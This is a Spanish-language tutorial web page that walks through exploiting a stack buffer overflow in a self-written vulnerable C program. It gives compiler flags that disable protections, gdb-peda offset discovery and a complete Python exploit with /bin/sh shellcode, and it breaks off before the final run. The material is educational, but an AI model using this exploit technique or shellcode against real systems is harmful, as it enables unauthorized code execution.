<!doctype html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>Buffer Oveflow Linux</title>
<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://avatars.githubusercontent.com/u/95899548?v=4">
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="Buffer Oveflow Linux" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Explotación de Buffer Overflow en un binario de Linux" />
<meta property="og:description" content="Explotación de Buffer Overflow en un binario de Linux" />
<link rel="canonical" href="http://localhost:4000/another-page.html" />
<meta property="og:url" content="http://localhost:4000/another-page.html" />
<meta property="og:site_name" content="Buffer Oveflow Linux" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Buffer Oveflow Linux" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"Explotación de Buffer Overflow en un binario de Linux","headline":"Explotación de Buffer Overflow en un binario de Linux","url":"http://localhost:4000/another-page.html"}</script>

    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
    <script src="/assets/js/respond.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

<meta name="theme-color" content="#353535">
<meta name="msapplication-navbutton-color" content="#353535">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

  </head>
  <body>

    <div class="wrapper">

      <section>
        <div id="title">
          <h1>Buffer Oveflow Linux</h1>
          <p>Explotación de Buffer Overflow en un binario de Linux</p>
        </div>

 <div><strong><h3>Preparación</h3></strong></div><br>

<div><p>Iniciaremos con un ejemplo básico como el del siguiente programa en c</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">#include </span><span class="s2">&ltstring.h></span><span class="p">
</span><span class="kd">#include </span><span class="s2">&ltstdio.h></span><span class="p">
</span><span class="k">void</span><span class="kd"> main</span><span class="p">(</span><span class="k">int </span><span class="no">argc</span><span class="p">,</span><span class="k"> char </span><span class="kd">*</span><span class="no">argv</span><span class="p">[]) {
    copier(argv[</span><span class="na">1</span><span class="p">]);
    </span><span class="k">printf</span><span class="p">(</span><span class="s2">"Buffer Overflow!\n"</span><span class="p">);
}
</span><span class="k">int</span><span class="kd"> copier</span><span class="p">(</span><span class="k">char</span><span class="kd"> *</span><span class="no">str</span><span class="p">) {
    </span><span class="k">char</span><span class="p"> buffer[</span><span class="na">128</span><span class="p">];
    </span><span class="k">strcpy</span><span class="p">(buffer, str);
}</span>
</code></pre></div></div><br>

<div><p>Podemos ver que el buffer asignado de 128, pero la vulnerabilidad realmente viene de usar la función strcpy con el input que proporcione el usuario</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="k">char </span><span class="p">buffer[</span><span class="na">128</span><span class="p">];
</span><span class="k">strcpy</span><span class="p">(buffer, str);</span>
</code></pre></div></div><br>

<div><p>Iniciaremos con la explotación, como esto será la explicación basica no queremos protecciones por lo que desactivaremos el ASLR en nuestra máquina, randomize_va_space tiene que valer 0</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ echo</span><span class="p"> 0 | </span><span class="s2">sudo tee </span><span class="p">/proc/sys/kernel/randomize_va_space
</span>
</code></pre></div></div><br>

<div><p>Ahora compilamos el archivo con extensión .c con ayuda de gcc con los siguientes parámetros para evitar protecciones que vienen por defecto</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="p">example.c                </span><span class="c1"># El nombre del archivo.c</span><span class="p">
-m32                     </span><span class="c1"># Indica que se compile para 32 bits (x86)</span><span class="p">
-z execstack             </span><span class="c1"># Deja que ejecutemos instrucciones en la pila</span><span class="p">
-fno-stack-protector     </span><span class="c1"># Deshabilita la protección en la pila</span><span class="p">
-no-pie                  </span><span class="c1"># Desgabilita Position Independent Executables</span><span class="p">
-o example               </span><span class="c1"># El nombre del binario que se cree</span>
</code></pre></div></div><br>

<div><p>Lo compilamos y nos crea el binario que nos printea la cadena 'Buffer Overflow!'</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ gcc </span><span class="p">example.c -m32 -z execstack -fno-stack-protector -no-pie -o example</span><span class="p">
example.c: In function ‘main’:
example.c:4:5: </span><span class="k">warning:</span><span class="p"> implicit declaration [</span><span class="k">-Wimplicit-function-declaration</span><span class="p">]
    4 |     </span><span class="k">copier</span><span class="p">(argv[1]);
      |     </span><span class="k">^~~~~~</span><span class="p">

</span><span class="s2">❯ ls</span><span class="p">
 example   example.c

</span><span class="s2">❯ ./example </span><span class="p">test
Buffer Overflow!</span>
</code></pre></div></div><br>

<div><strong><h3>Explotación</h3></strong></div><br>

<div><p>En este caso gracias a los parametros podemos ver todas las protecciondes deshabilitadas</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ checksec </span><span class="p">example
[</span><span class="na">*</span><span class="p">] '/root/example'
    Arch:     i386-32-little
    RELRO:    </span><span class="no">Partial RELRO</span><span class="p">
    Stack:    </span><span class="kd">No canary found</span><span class="p">
    NX:       </span><span class="kd">NX disabled</span><span class="p">
    PIE:      </span><span class="kd">No PIE (0x8048000)</span><span class="p">
    RWX:      </span><span class="kd">Has RWX segments</span>
</code></pre></div></div><br>

<div><p>Para empezar a explotarlo usaremos gdb, en mi caso con <a href="https://github.com/longld/peda">peda</a> para algunas funciones</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ gdb </span><span class="p">-q ./example
Reading symbols from </span><span class="s2">./example</span><span class="p">...
(No debugging symbols found in </span><span class="s2">./example</span><span class="p">)
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Para buscar el offset creamos un argumento que valga un patron de 200 caracteres con pattern_arg</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$ </span><span class="p">pattern_arg 200
Set 1 arguments to program
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Al correr el programa se ejecutara con el argumento, y nos devuelve el valor que tiene EIP</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$ </span><span class="p">run
Starting program: ./example 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'

Program received signal SIGSEGV, Segmentation fault.
</span><span class="na">[----------------------------------registers-----------------------------------]
</span><span class="s2">EAX</span><span class="p">:</span><span class="na"> 0xffffd5e0</span><span class="p"> ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
</span><span class="s2">EBX</span><span class="p">: 0x6c414150 ('PAAl')
</span><span class="s2">ECX</span><span class="p">:</span><span class="na"> 0xffffd9e0</span><span class="p"> ("wAAZAAxAAyA")
</span><span class="s2">EDX</span><span class="p">:</span><span class="na"> 0xffffd69d</span><span class="p"> ("wAAZAAxAAyA")
</span><span class="s2">ESI</span><span class="p">:</span><span class="na"> 0xf7fa5000</span><span class="p"> --> 0x1e4d6c 
</span><span class="s2">EDI</span><span class="p">:</span><span class="na"> 0xf7fa5000</span><span class="p"> --> 0x1e4d6c 
</span><span class="s2">EBP</span><span class="p">: 0x41514141 ('AAQA')
</span><span class="s2">ESP</span><span class="p">:</span><span class="na"> 0xffffd670</span><span class="p"> ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
</span><span class="s2">EIP</span><span class="p">: 0x41416d41 ('AmAA')
</span><span class="s2">EFLAGS</span><span class="p">: 0x10282 (</span><span class="s2">carry parity adjust zero </span><span class="kd">SIGN </span><span class="s2">trap</span><span class="kd"> INTERRUPT </span><span class="s2">direction overflow</span><span class="p">)
</span><span class="na">[-------------------------------------code-------------------------------------]
</span><span class="kd">Invalid $PC address: 0x41416d41
</span><span class="na">[------------------------------------stack-------------------------------------]</span><span class="p">
0000| </span><span class="na">0xffffd670</span><span class="p"> ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| </span><span class="na">0xffffd674</span><span class="p"> ("AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| </span><span class="na">0xffffd678</span><span class="p"> ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| </span><span class="na">0xffffd67c</span><span class="p"> ("TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| </span><span class="na">0xffffd680</span><span class="p"> ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| </span><span class="na">0xffffd684</span><span class="p"> ("ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| </span><span class="na">0xffffd688</span><span class="p"> ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| </span><span class="na">0xffffd68c</span><span class="p"> ("AAWAAuAAXAAvAAYAAwAAZAAxAAyA")</span><span class="na">
[------------------------------------------------------------------------------]</span><span class="p">
Legend: </span><span class="kd">code</span><span class="p">, </span><span class="na">data</span><span class="p">,</span><span class="s2"> rodata</span><span class="p">, value
Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
</span><span class="na">0x41416d41</span><span class="p"> in </span><span class="no">??</span><span class="p"> ()
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Con pattern_offset podemos saber cuantos bytes se necesitan antes de llegar a sobreescribir EIP</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$ </span><span class="p">pattern_offset 0x41416d41
1094806849 found at offset: </span><span class="na">140</span><span class="p">
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Empezaremos a crear el script en python llamado exploit.py, iniciamos por definir el offset</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 140</span>
</code></pre></div></div><br>

<div><p>Ahora definimos un <a href="https://www.exploit-db.com/shellcodes/13628">shellcode</a> que nos ejecute la cadena '/bin/sh' para conseguir una shell</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 140</span><span class="p">

shellcode  </span><span class="kd">= </span><span class="k">b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x6a\x0b\x58\x99\x52\x68\x2f"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x2f\x73\x68\x68\x2f\x62\x69"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x6e\x89\xe3\x31\xc9\xcd\x80"</span>
</code></pre></div></div><br>

<div><p>No podemos pasarnos de 140 bytes ya que si lo hacemos sobreescribiremos EIP, asi que el junk será el offset menos la longitud de el shellcode, asi al sumarlos seguira siendo 140</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 140</span><span class="p">

shellcode  </span><span class="kd">= </span><span class="k">b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x6a\x0b\x58\x99\x52\x68\x2f"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x2f\x73\x68\x68\x2f\x62\x69"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x6e\x89\xe3\x31\xc9\xcd\x80"</span><span class="p">

junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x90"</span><span class="kd"> *</span><span class="p"> (offset </span><span class="kd">-</span><span class="k"> len</span><span class="p">(shellcode))</span>
</code></pre></div></div><br>

<blockquote><strong><div><p>¿Porque usar '\x90' para rellenar el espacio para llegar a EIP?</p></div></strong>
<div><p>Se usa '\x90' ya que es un nop (No Operation), al apuntar a el pasa a la siguiente instrucción y esto nos permite desplazar la pila y no tener que apuntar a la dirección exacta del shellcode</p></div></blockquote><br>

<div><p>Por ahora rellenaremos el lugar de la dirección del EIP con BBBB y asi poder debuguear</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 140</span><span class="p">

shellcode  </span><span class="kd">= </span><span class="k">b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x6a\x0b\x58\x99\x52\x68\x2f"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x2f\x73\x68\x68\x2f\x62\x69"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x6e\x89\xe3\x31\xc9\xcd\x80"</span><span class="p">

junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x90"</span><span class="kd"> *</span><span class="p"> (offset </span><span class="kd">-</span><span class="k"> len</span><span class="p">(shellcode))

eip </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"B"</span><span class="kd"> *</span><span class="na"> 4</span><span class="k">

print</span><span class="p">(junk </span><span class="kd">+</span><span class="p"> shellcode </span><span class="kd">+</span><span class="p"> eip)</span>
</code></pre></div></div><br>

<div><p>Ejecutamos el programa de nuevo ahora pasando el exploit ejecutado como argumento</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ gdb </span><span class="p">-q ./example
Reading symbols from </span><span class="s2">./example</span><span class="p">...
(No debugging symbols found in </span><span class="s2">./example</span><span class="p">)
</span><span class="kd">gdb-peda$</span><span class="p"> run $(python2 exploit.py)
Starting program: ./example $(python2 exploit.py)

Program received signal SIGSEGV, Segmentation fault.
</span><span class="na">[----------------------------------registers-----------------------------------]</span><span class="p">
</span><span class="s2">EAX</span><span class="p">:</span><span class="na"> 0xffffd620</span><span class="p"> --> 0x90909090 
</span><span class="s2">EBX</span><span class="p">: 0x535152e3 
</span><span class="s2">ECX</span><span class="p">:</span><span class="na"> 0xffffd9e0</span><span class="p"> --> 0x89535152 
</span><span class="s2">EDX</span><span class="p">:</span><span class="na"> 0xffffd6a5</span><span class="p"> --> 0x89535152 
</span><span class="s2">ESI</span><span class="p">:</span><span class="na"> 0xf7fa5000</span><span class="p"> --> 0x1e4d6c 
</span><span class="s2">EDI</span><span class="p">:</span><span class="na"> 0xf7fa5000</span><span class="p"> --> 0x1e4d6c 
</span><span class="s2">EBP</span><span class="p">: 0x80cde189 
</span><span class="s2">ESP</span><span class="p">:</span><span class="na"> 0xffffd6b0</span><span class="p"> --> </span><span class="na">0xffffd900</span><span class="p"> --> 0x1f 
</span><span class="s2">EIP</span><span class="p">: 0x42424242 ('BBBB')
</span><span class="s2">EFLAGS</span><span class="p">: 0x10282 (</span><span class="s2">carry parity adjust zero </span><span class="kd">SIGN </span><span class="s2">trap </span><span class="kd">INTERRUPT </span><span class="s2">direction overflow</span><span class="p">)
</span><span class="na">[-------------------------------------code-------------------------------------]
</span><span class="kd">Invalid $PC address: 0x42424242
</span><span class="na">[------------------------------------stack-------------------------------------]</span><span class="p">
0000| </span><span class="na">0xffffd6b0</span><span class="p"> --> </span><span class="na">0xffffd900</span><span class="p"> --> 0x1f 
0004| </span><span class="na">0xffffd6b4</span><span class="p"> --> </span><span class="na">0xffffd784</span><span class="p"> --> </span><span class="na">0xffffd934</span><span class="p"> ("./example")
0008| </span><span class="na">0xffffd6b8</span><span class="p"> --> </span><span class="na">0xffffd790</span><span class="p"> --> </span><span class="na">0xffffd9ec</span><span class="p"> ("SSH_AUTH_SOCK=/tmp/ssh-2Uc5Apks9SCR/agent.1352")
0012| </span><span class="na">0xffffd6bc</span><span class="p"> --> </span><span class="kd">0x565561bd</span><span class="p"> (&ltmain+20>:	add    ebx,0x2e43)
0016| </span><span class="na">0xffffd6c0</span><span class="p"> --> </span><span class="na">0xffffd6e0</span><span class="p"> --> 0x2 
0020| </span><span class="na">0xffffd6c4</span><span class="p"> --> 0x0 
0024| </span><span class="na">0xffffd6c8</span><span class="p"> --> 0x0 
0028| </span><span class="na">0xffffd6cc</span><span class="p"> --> </span><span class="kd">0xf7ddae46</span><span class="p"> (<__libc_start_main+262>:	add    esp,0x10)
</span><span class="na">[------------------------------------------------------------------------------]</span><span class="p">
Legend: </span><span class="kd">code</span><span class="p">, </span><span class="na">data</span><span class="p">, </span><span class="s2">rodata</span><span class="p">, value
Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
</span><span class="na">0x42424242 </span><span class="p">in </span><span class="no">??</span><span class="p"> ()
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Ahora en la pila buscaremos una dirección que solo tenga a los nops (0x90909090)</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">gdb-peda$ </span><span class="p">x/300wx $esp
</span><span class="na">0xffffd6b0</span><span class="p">:	0xffffd900	0xffffd784	0xffffd790	0x565561bd</span><span class="p">
</span><span class="na">0xffffd6c0</span><span class="p">:	0xffffd6e0	0x00000000	0x00000000	0xf7ddae46</span><span class="p">
</span><span class="na">0xffffd6d0</span><span class="p">:	0xf7fa5000	0xf7fa5000	0x00000000	0xf7ddae46</span><span class="p">
</span><span class="na">0xffffd6e0</span><span class="p">:	0x00000002	0xffffd784	0xffffd790	0xffffd714</span><span class="p">
</span><span class="na">0xffffd6f0</span><span class="p">:	0xffffd724	0xf7ffdb40	0xf7fca420	0xf7fa5000</span><span class="p">
</span><span class="na">0xffffd700</span><span class="p">:	0x00000001	0x00000000	0xffffd768	0x00000000</span><span class="p">
</span><span class="na">0xffffd710</span><span class="p">:	0xf7ffd000	0x00000000	0xf7fa5000	0xf7fa5000</span><span class="p">
</span><span class="na">0xffffd720</span><span class="p">:	0x00000000	0x1be93902	0x5f1f0712	0x00000000</span><span class="p">
</span><span class="na">0xffffd730</span><span class="p">:	0x00000000	0x00000000	0x00000002	0x56556070</span><span class="p">
</span><span class="na">0xffffd740</span><span class="p">:	0x00000000	0xf7fe88f0	0xf7fe3230	0x56559000</span><span class="p">
</span><span class="na">0xffffd750</span><span class="p">:	0x00000002	0x56556070	0x00000000	0x565560a1</span><span class="p">
</span><span class="na">0xffffd760</span><span class="p">:	0x565561a9	0x00000002	0xffffd784	0x56556230</span><span class="p">
</span><span class="na">0xffffd770</span><span class="p">:	0x56556290	0xf7fe3230	0xffffd77c	0x0000001c</span><span class="p">
</span><span class="na">0xffffd780</span><span class="p">:	0x00000002	0xffffd934	0xffffd95b	0x00000000</span><span class="p">
</span><span class="na">0xffffd790</span><span class="p">:	0xffffd9ec	0xffffda1b	0xffffda2e	0xffffda3f</span><span class="p">
</span><span class="na">0xffffd7a0</span><span class="p">:	0xffffda47	0xffffda65	0xffffda95	0xffffdaa9</span><span class="p">
</span><span class="na">0xffffd7b0</span><span class="p">:	0xffffdadd	0xffffdae7	0xffffdafd	0xffffdb23</span><span class="p">
</span><span class="na">0xffffd7c0</span><span class="p">:	0xffffdb5d	0xffffdb6d	0xffffdb7e	0xffffdbb4</span><span class="p">
</span><span class="na">0xffffd7d0</span><span class="p">:	0xffffdbbf	0xffffdbce	0xffffdbe5	0xffffdbfc</span><span class="p">
</span><span class="na">0xffffd7e0</span><span class="p">:	0xffffdc18	0xffffdc41	0xffffdc50	0xffffdc6a</span><span class="p">
</span><span class="na">0xffffd7f0</span><span class="p">:	0xffffdc7d	0xffffdc98	0xffffdcac	0xffffdce0</span><span class="p">
</span><span class="na">0xffffd800</span><span class="p">:	0xffffdced	0xffffdd02	0xffffddd8	0xffffddf7</span><span class="p">
</span><span class="na">0xffffd810</span><span class="p">:	0xffffde09	0xffffde1c	0xffffde2d	0xffffde45</span><span class="p">
</span><span class="na">0xffffd820</span><span class="p">:	0xffffde5e	0xffffde73	0xffffde8d	0xffffdeb0</span><span class="p">
</span><span class="na">0xffffd830</span><span class="p">:	0xffffded2	0xffffdee6	0xffffdefd	0xffffdf14</span><span class="p">
</span><span class="na">0xffffd840</span><span class="p">:	0xffffdf25	0xffffdf30	0xffffdf44	0xffffdf62</span><span class="p">
</span><span class="na">0xffffd850</span><span class="p">:	0xffffdf92	0xffffdf9c	0xffffdfa8	0xffffdfbc</span><span class="p">
</span><span class="na">0xffffd860</span><span class="p">:	0xffffdfc5	0x00000000	0x00000020	0xf7fd0550</span><span class="p">
</span><span class="na">0xffffd870</span><span class="p">:	0x00000021	0xf7fd0000	0x00000033	0x000006f0</span><span class="p">
</span><span class="na">0xffffd880</span><span class="p">:	0x00000010	0x078bfbff	0x00000006	0x00001000</span><span class="p">
</span><span class="na">0xffffd890</span><span class="p">:	0x00000011	0x00000064	0x00000003	0x56555034</span><span class="p">
</span><span class="na">0xffffd8a0</span><span class="p">:	0x00000004	0x00000020	0x00000005	0x0000000b</span><span class="p">
</span><span class="na">0xffffd8b0</span><span class="p">:	0x00000007	0xf7fd2000	0x00000008	0x00000000</span><span class="p">
</span><span class="na">0xffffd8c0</span><span class="p">:	0x00000009	0x56556070	0x0000000b	0x000003e8</span><span class="p">
</span><span class="na">0xffffd8d0</span><span class="p">:	0x0000000c	0x000003e8	0x0000000d	0x000003eb</span><span class="p">
</span><span class="na">0xffffd8e0</span><span class="p">:	0x0000000e	0x000003eb	0x00000017	0x00000000</span><span class="p">
</span><span class="na">0xffffd8f0</span><span class="p">:	0x00000019	0xffffd91b	0x0000001a	0x00000002</span><span class="p">
</span><span class="na">0xffffd900</span><span class="p">:	0x0000001f	0xffffdfd1	0x0000000f	0xffffd92b</span><span class="p">
</span><span class="na">0xffffd910</span><span class="p">:	0x00000000	0x00000000	0x82000000	0x7cb2e1a0</span><span class="p">
</span><span class="na">0xffffd920</span><span class="p">:	0x6a7ef222	0xf555e56f	0x69d2e273	0x00363836</span><span class="p">
</span><span class="na">0xffffd930</span><span class="p">:	0x00000000	0x6d6f682f	0x61672f65	0x442f6f74</span><span class="p">
</span><span class="na">0xffffd940</span><span class="p">:	0x746b7365	0x422f706f	0x652f464f	0x706d6178</span><span class="p">
</span><span class="na">0xffffd950</span><span class="p">:	0x652f656c	0x706d6178	0x9000656c	0x90909090</span><span class="p">
</span><span class="na">0xffffd960</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span><span class="p">
</span><span class="na">0xffffd970</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span><span class="p">
</span><span class="na">0xffffd980</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span><span class="p">
</span><span class="na">0xffffd990</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span><span class="p">
</span><span class="na">0xffffd9a0</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span><span class="p">
</span><span class="na">0xffffd9b0</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span><span class="p">
</span><span class="na">0xffffd9c0</span><span class="p">:	0x90909090	0x0b6a9090	0x66529958	0x89702d68</span><span class="p">
</span><span class="na">0xffffd9d0</span><span class="p">:	0x686a52e1	0x61622f68	0x622f6873	0xe3896e69</span><span class="p">
</span><span class="na">0xffffd9e0</span><span class="p">:	0x89535152	0x4280cde1	0x00424242	0x5f485353</span><span class="p">
</span><span class="na">0xffffd9f0</span><span class="p">:	0x48545541	0x434f535f	0x742f3d4b	0x732f706d</span><span class="p">
</span><span class="na">0xffffda00</span><span class="p">:	0x322d6873	0x41356355	0x39736b70	0x2f524353</span><span class="p">
</span><span class="na">0xffffda10</span><span class="p">:	0x6e656761	0x33312e74	0x53003235	0x415f4853</span><span class="p">
</span><span class="na">0xffffda20</span><span class="p">:	0x544e4547	0x4449505f	0x3034313d	0x414c0039</span><span class="p">
</span><span class="na">0xffffda30</span><span class="p">:	0x653d474e	0x584d5f73	0x4654552e	0x5300382d</span><span class="p">
</span><span class="na">0xffffda40</span><span class="p">:	0x4c564c48	0x4c00313d	0x44495f43	0x49544e45</span><span class="p">
</span><span class="na">0xffffda50</span><span class="p">:	0x41434946	0x4e4f4954	0x5f73653d	0x552e584d</span><span class="p">
</span><span class="na">0xffffda60</span><span class="p">:	0x382d4654	0x47445800	0x4552475f	0x52455445</span><span class="p">
</span><span class="na">0xffffda70</span><span class="p">:	0x5441445f	0x49445f41	0x762f3d52	0x6c2f7261</span><span class="p">
</span><span class="na">0xffffda80</span><span class="p">:	0x6c2f6269	0x74686769	0x642f6d64	0x2f617461</span><span class="p">
</span><span class="na">0xffffda90</span><span class="p">:	0x6f746167	0x4c4f4300	0x4554524f	0x743d4d52</span><span class="p">
</span><span class="na">0xffffdaa0</span><span class="p">:	0x63657572	0x726f6c6f	0x47504700	0x4547415f</span><span class="p">
</span><span class="na">0xffffdab0</span><span class="p">:	0x495f544e	0x3d4f464e	0x6e75722f	0x6573752f</span><span class="p">
</span><span class="na">0xffffdac0</span><span class="p">:	0x30312f72	0x672f3030	0x6770756e	0x672e532f</span><span class="p">
</span><span class="na">0xffffdad0</span><span class="p">:	0x612d6770	0x746e6567	0x313a303a	0x45535500</span><span class="p">
</span><span class="na">0xffffdae0</span><span class="p">:	0x61673d52	0x44006f74	0x544b5345	0x535f504f</span><span class="p">
</span><span class="na">0xffffdaf0</span><span class="p">:	0x49535345	0x623d4e4f	0x6d777073	0x444c4f00</span><span class="p">
</span><span class="na">0xffffdb00</span><span class="p">:	0x3d445750	0x6d6f682f	0x61672f65	0x442f6f74</span><span class="p">
</span><span class="na">0xffffdb10</span><span class="p">:	0x746b7365	0x422f706f	0x652f464f	0x706d6178</span><span class="p">
</span><span class="na">0xffffdb20</span><span class="p">:	0x5800656c	0x535f4744	0x49535345	0x505f4e4f</span><span class="p">
</span><span class="na">0xffffdb30</span><span class="p">:	0x3d485441	0x67726f2f	0x6572662f	0x73656465</span><span class="p">
</span><span class="na">0xffffdb40</span><span class="p">:	0x706f746b	0x7369442f	0x79616c70	0x616e614d</span><span class="p">
</span><span class="na">0xffffdb50</span><span class="p">:	0x2f726567	0x73736553	0x306e6f69	0x4d4f4800</span><span class="p">
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div><br>

<div><p>Nos quedamos con uno que en los 4 campos solo tenga nops (0x90909090)</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="na">0xffffd9a0</span><span class="p">:	0x90909090	0x90909090	0x90909090	0x90909090</span>
</code></pre></div></div><br>

<div><p>Ya que estamos en little endian tendremos que darle la vuelta a la dirección de la siguiente forma</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="na">0xffffd9a0</span><span class="p">     -->     </span><span class="na">\xff\xff\xd9\xa0</span><span class="p">     -->     </span><span class="na">\xa0\xd9\xff\xff</span>
</code></pre></div></div><br>

<div><p>Nuestro script final para explotarlo quedaría de la siguiente forma</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python2
</span><span class="p">
offset </span><span class="kd">=</span><span class="na"> 140</span><span class="p">

shellcode  </span><span class="kd">= </span><span class="k">b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x6a\x0b\x58\x99\x52\x68\x2f"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x2f\x73\x68\x68\x2f\x62\x69"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x6e\x89\xe3\x31\xc9\xcd\x80"</span><span class="p">

junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x90"</span><span class="kd"> *</span><span class="p"> (offset </span><span class="kd">-</span><span class="k"> len</span><span class="p">(shellcode))

eip </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\xa0\xd9\xff\xff"</span><span class="k">

print</span><span class="p">(junk </span><span class="kd">+</span><span class="p"> shellcode </span><span class="kd">+</span><span class="p"> eip)</span>
</code></pre></div></div><br>

<blockquote><strong><div><p>¿Qué hace exactamente el script de explotación?</p></div></strong>
<li>Se define el shellcode para que se ejecute la cadena '/bin/sh'</li>
<li>Se rellena con nops los bytes que se necesitan para llegar al EIP</li>
<li>Se apunta a una dirección donde haya nops para que al desplazarse se ejecute el shellcode</li>
<li>Al ejecutarse el shellcode nos tira una sh como el propietario de el binario</li>
</blockquote><br><br>

<div><p>Ejecutamos el binario con el exploit ejecutado como argumento y nos lanza una sh, lo explotamos</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
